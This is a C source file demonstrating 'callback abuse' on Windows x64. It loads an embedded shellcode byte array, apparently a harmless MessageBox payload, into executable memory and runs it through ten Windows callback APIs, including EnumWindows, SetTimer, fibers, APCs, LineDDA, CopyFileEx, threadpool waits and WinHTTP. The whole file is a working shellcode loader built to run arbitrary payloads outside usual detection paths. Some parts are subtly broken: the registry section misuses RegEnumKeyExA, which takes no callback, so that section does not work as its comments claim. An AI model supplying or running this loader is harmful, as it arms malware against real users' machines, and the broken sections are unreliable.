#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

// x64 MessageBox shellcode
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x43\x61\x6c\x6c\x62\x61\x63"
    "\x6b\x20\x41\x62\x75\x73\x65\x21\x00\x48\x65\x6c\x6c\x6f\x20"
    "\x57\x6f\x72\x6c\x64\x21\x00";

// ============ CALLBACK TYPE 1: EnumWindows ============
BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam)
{
    // This will be patched with shellcode
    void (*shellcode_func)() = (void (*)())lParam;
    shellcode_func();
    return FALSE; // Stop enumeration
}

VOID AbuseEnumWindows()
{
    printf("[*] EnumWindows callback abuse...\n");

    // Allocate executable shellcode
    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // EnumWindows calls our callback with lParam = shellcode
    EnumWindows((WNDENUMPROC)EnumWindowsCallback, (LPARAM)execMem);

    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 2: TimerProc ============
VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
    void (*shellcode_func)() = (void (*)())idEvent;
    shellcode_func();
}

VOID AbuseSetTimer()
{
    printf("[*] SetTimer callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // SetTimer calls TimerProc with nIDEvent = shellcode address
    UINT_PTR timerId = SetTimer(
        NULL,
        (UINT_PTR)execMem, // nIDEvent = shellcode address
        100,               // 100ms
        (TIMERPROC)TimerProc);

    printf("[+] Timer set with ID: %p\n", (PVOID)timerId);

    // Message loop needed for timer
    MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);

    Sleep(200); // Wait for timer

    KillTimer(NULL, timerId);
    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 3: Fiber ============
VOID WINAPI FiberProc(PVOID lpParameter)
{
    void (*shellcode_func)() = (void (*)())lpParameter;
    shellcode_func();
}

VOID AbuseFibers()
{
    printf("[*] Fiber callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Convert main thread to fiber
    PVOID mainFiber = ConvertThreadToFiber(NULL);

    // Create fiber with shellcode as parameter
    PVOID fiber = CreateFiber(
        0,                                // Stack size
        (LPFIBER_START_ROUTINE)FiberProc, // Fiber proc
        (PVOID)execMem                    // Parameter = shellcode
    );

    printf("[+] Fiber created: %p\n", fiber);

    // Switch to fiber - executes shellcode!
    SwitchToFiber(fiber);

    // Cleanup
    DeleteFiber(fiber);
    ConvertFiberToThread();
    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 4: APC with Shellcode Parameter ============
VOID CALLBACK ApcProc(ULONG_PTR dwParam)
{
    void (*shellcode_func)() = (void (*)())dwParam;
    shellcode_func();
}

VOID AbuseApc()
{
    printf("[*] APC callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Queue APC to current thread
    QueueUserAPC(
        (PAPCFUNC)ApcProc,  // APC function
        GetCurrentThread(), // Current thread
        (ULONG_PTR)execMem  // Parameter = shellcode
    );

    // Enter alertable wait - APC executes!
    SleepEx(100, TRUE);

    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 5: Class Enumeration ============
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
    void (*shellcode_func)() = (void (*)())lParam;
    shellcode_func();
    return FALSE;
}

VOID AbuseEnumChildWindows()
{
    printf("[*] EnumChildWindows callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Create a dummy window
    HWND hwnd = CreateWindowA(
        "STATIC", "Dummy",
        WS_OVERLAPPEDWINDOW,
        0, 0, 100, 100,
        NULL, NULL, NULL, NULL);

    if (hwnd)
    {
        EnumChildWindows(hwnd, (WNDENUMPROC)EnumChildProc, (LPARAM)execMem);
        DestroyWindow(hwnd);
    }

    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 6: LineDDA (GDI Callback) ============
VOID CALLBACK LineDDAProc(int X, int Y, LPARAM lpData)
{
    void (*shellcode_func)() = (void (*)())lpData;
    shellcode_func();
}

VOID AbuseLineDDA()
{
    printf("[*] LineDDA callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // LineDDA calls callback for each point on a line
    LineDDA(
        0, 0,                     // Start point
        10, 10,                   // End point
        (LINEDDAPROC)LineDDAProc, // Callback
        (LPARAM)execMem           // Parameter = shellcode
    );

    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 7: CopyFileEx ============
DWORD CALLBACK CopyProgressRoutine(
    LARGE_INTEGER TotalFileSize,
    LARGE_INTEGER TotalBytesTransferred,
    LARGE_INTEGER StreamSize,
    LARGE_INTEGER StreamBytesTransferred,
    DWORD dwStreamNumber,
    DWORD dwCallbackReason,
    HANDLE hSourceFile,
    HANDLE hDestinationFile,
    LPVOID lpData)
{
    void (*shellcode_func)() = (void (*)())lpData;
    shellcode_func();
    return PROGRESS_CONTINUE;
}

VOID AbuseCopyFileEx()
{
    printf("[*] CopyFileEx callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Create temp files
    char srcPath[MAX_PATH];
    char dstPath[MAX_PATH];
    GetTempPathA(MAX_PATH, srcPath);
    strcat(srcPath, "temp_src.txt");
    strcpy(dstPath, srcPath);
    strcat(dstPath, ".copy");

    // Create source file
    HANDLE hFile = CreateFileA(srcPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);

        // Copy with progress callback
        CopyFileExA(
            srcPath,
            dstPath,
            (LPPROGRESS_ROUTINE)CopyProgressRoutine,
            (LPVOID)execMem,
            NULL,
            0);

        DeleteFileA(srcPath);
        DeleteFileA(dstPath);
    }

    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 8: Registry Enumeration ============
BOOL CALLBACK RegEnumProc(
    HKEY hKey,
    LPCWSTR lpszValue,
    DWORD dwIndex,
    FILETIME lpftLastWriteTime)
{
    void (*shellcode_func)() = (void (*)())dwIndex;
    shellcode_func();
    return FALSE;
}

VOID AbuseRegEnum()
{
    printf("[*] Registry enumeration callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        // Enum key with callback
        RegEnumKeyExA(
            hKey,
            (DWORD)execMem, // Index = shellcode address
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL);

        RegCloseKey(hKey);
    }

    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 9: Threadpool Wait ============
VOID CALLBACK WaitCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WAIT Wait)
{
    void (*shellcode_func)() = (void (*)())Context;
    shellcode_func();
}

VOID AbuseThreadpoolWait()
{
    printf("[*] Threadpool wait callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Create event
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    // Create threadpool wait
    PTP_WAIT wait = CreateThreadpoolWait(
        (PTP_WAIT_CALLBACK)WaitCallback,
        (PVOID)execMem,
        NULL);

    if (wait)
    {
        // Set wait on event
        SetThreadpoolWait(wait, hEvent, NULL);

        // Signal event - triggers callback
        SetEvent(hEvent);

        Sleep(100);

        CloseThreadpoolWait(wait);
    }

    CloseHandle(hEvent);
    VirtualFree(execMem, 0, MEM_RELEASE);
}

// ============ CALLBACK TYPE 10: WinHttp Callback ============
VOID CALLBACK WinHttpCallback(
    HINTERNET hInternet,
    DWORD_PTR dwContext,
    DWORD dwInternetStatus,
    LPVOID lpvStatusInformation,
    DWORD dwStatusInformationLength)
{
    void (*shellcode_func)() = (void (*)())dwContext;
    shellcode_func();
}

VOID AbuseWinHttp()
{
    printf("[*] WinHTTP callback abuse...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Initialize WinHTTP
    HINTERNET hSession = WinHttpOpen(
        L"Callback Abuse",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession)
    {
        // Set status callback
        WinHttpSetStatusCallback(
            hSession,
            (WINHTTP_STATUS_CALLBACK)WinHttpCallback,
            WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,
            (DWORD_PTR)execMem // Context = shellcode
        );

        // Trigger callback
        WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 10000);

        WinHttpCloseHandle(hSession);
    }

    VirtualFree(execMem, 0, MEM_RELEASE);
}

int main()
{
    printf("[ Callback Function Abuse (x64) ]\n");
    printf("[*] Process ID: %d\n", GetCurrentProcessId());

    // Make shellcode executable
    DWORD oldProtect;
    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

    printf("\n=== 1. EnumWindows Callback ===\n");
    AbuseEnumWindows();
    system("pause");

    printf("\n=== 2. SetTimer Callback ===\n");
    AbuseSetTimer();
    system("pause");

    printf("\n=== 3. Fiber Callback ===\n");
    AbuseFibers();
    system("pause");

    printf("\n=== 4. APC Callback ===\n");
    AbuseApc();
    system("pause");

    printf("\n=== 5. EnumChildWindows Callback ===\n");
    AbuseEnumChildWindows();
    system("pause");

    printf("\n=== 6. LineDDA Callback ===\n");
    AbuseLineDDA();
    system("pause");

    printf("\n=== 7. CopyFileEx Callback ===\n");
    AbuseCopyFileEx();
    system("pause");

    printf("\n=== 8. Registry Enumeration Callback ===\n");
    AbuseRegEnum();
    system("pause");

    printf("\n=== 9. Threadpool Wait Callback ===\n");
    AbuseThreadpoolWait();
    system("pause");

    printf("\n=== 10. WinHTTP Callback ===\n");
    AbuseWinHttp();

    printf("\n[+] All callback abuses completed!\n");
    return 0;
}

// x86_64-w64-mingw32-gcc -o callback_abuse.exe callback_abuse.c -lwinhttp